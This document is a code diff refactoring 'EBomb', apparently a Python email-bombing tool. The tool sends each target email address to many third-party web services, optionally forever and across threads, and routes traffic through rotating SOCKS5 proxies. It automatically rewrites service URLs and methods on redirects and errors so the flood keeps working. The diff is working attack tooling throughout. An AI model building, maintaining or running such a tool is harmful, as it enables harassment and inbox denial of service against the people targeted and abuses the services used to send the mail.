@@ -1,7 +1,6 @@
 from __future__ import annotations
 
 import atexit
-import json
 import multiprocessing
 import reprlib
 import shutil
@@ -10,8 +9,8 @@ from multiprocessing.pool import ThreadPool
 from urllib.error import URLError
 
 import EasyProxies
+import httpx
 import spys.me
-from requests.exceptions import RequestException
 from rich.console import Console
 
 from EBomb.services import *
@@ -22,8 +21,9 @@ __all__ = ('EBomb', 'Service', 'services')
 class EBomb:
     __slots__ = ('console',
                  'targets', 'forever',
-                 '_max_netloc_len', '_max_email_len', '_max_right_align', '_repr',
+                 '_max_netloc_len', '_max_email_len', '_max_right_align',
                  '__proxies', '_working_proxy', 'proxy')
+    _REPR = reprlib.Repr()
 
     class _Markup:
         """Contain colors for rich print"""
@@ -45,9 +45,8 @@ class EBomb:
 
         self._max_netloc_len = max(len(serv.netloc) for serv in services)
         self._max_email_len = max(len(e) for e in targets)
-        self._max_right_align = 70 + self._max_netloc_len + self._max_email_len
-
-        self._repr = reprlib.Repr()
+        self._max_right_align = (self._max_netloc_len + self._max_email_len
+                                 + 70)  # 70 is for '__init__.py:...' at the end of the log
 
         if proxy:
             self.__proxies = self._socks5_proxies
@@ -58,8 +57,8 @@ class EBomb:
         self.proxy = proxy
 
         def _at_exit():
-            with open(JSON_DB_FILE_PATH, 'w', encoding='UTF-8') as update_json:
-                json.dump([(serv.method, serv.url) for serv in services], update_json)
+            with open(SERVICES_DB_FILE_PATH, 'w', encoding='UTF-8') as upd_serv:
+                upd_serv.write('\n\n'.join(str(serv) for serv in services))
 
         atexit.register(_at_exit)
 
@@ -75,7 +74,7 @@ class EBomb:
 
         args = [(service, email) for email in self.targets for service in services]
 
-        self.console.print(
+        self.console.log(
             f"[blue][i]Running "
             f"{'[green]forever[/]' if self.forever else f'on [green]{len(args)}[/] calls'} "
             f"([green]{threads_count}[/] thread{'s' if threads_count != 1 else ''})... "
@@ -142,27 +141,27 @@ class EBomb:
         try:
             resp = service.request(email, proxies=_proxy)
             code = resp.status_code
-        except RequestException as Error:
-            _markup.response = 'italic red'
+        except httpx.HTTPError as Error:
+            _markup.response = 'i red'
 
-            self._repr.maxother = self._max_other
-            resp = self._repr.repr(Error)
+            self._REPR.maxother = self._max_other
+            resp = self._REPR.repr(Error)
 
-            code = None if Error.response is None else Error.response.status_code
+            code = Error.response.status_code if hasattr(Error, 'response') else None
         if service in services and code in {301, 308, 403, 404, 405}:
             _markup.response = 'yellow'
             pos = services.index(service)
             if code in {301, 308}:
-                new_loc = resp.headers.get('Location') if resp is not None else None
+                new_loc = resp.headers.get('Location', resp.headers.get('location')) if resp is not None else None
                 if new_loc:
-                    _markup.service = 'italic green'
+                    _markup.service = 'i green'
                     services[pos].url = new_loc
                     services[pos].method = 'GET' if code == 301 else 'POST'
                 else:
                     _markup.service = 'red'
                     services.pop(pos)
             elif code == 403:
-                _markup.service = 'italic red'
+                _markup.service = 'i red'
             elif code == 404:
                 _markup.service = 'red'
                 services.pop(pos)
@@ -172,7 +171,7 @@ class EBomb:
                 if meth.upper() == 'GET':
                     services[pos].method = 'POST'
                 else:
-                    _markup.method = 'italic red'
+                    _markup.method = 'i red'
                     services.append(Service(service.url, 'GET'))
         elif code in {None, 401, 407}:
             _markup.proxy = 'red'
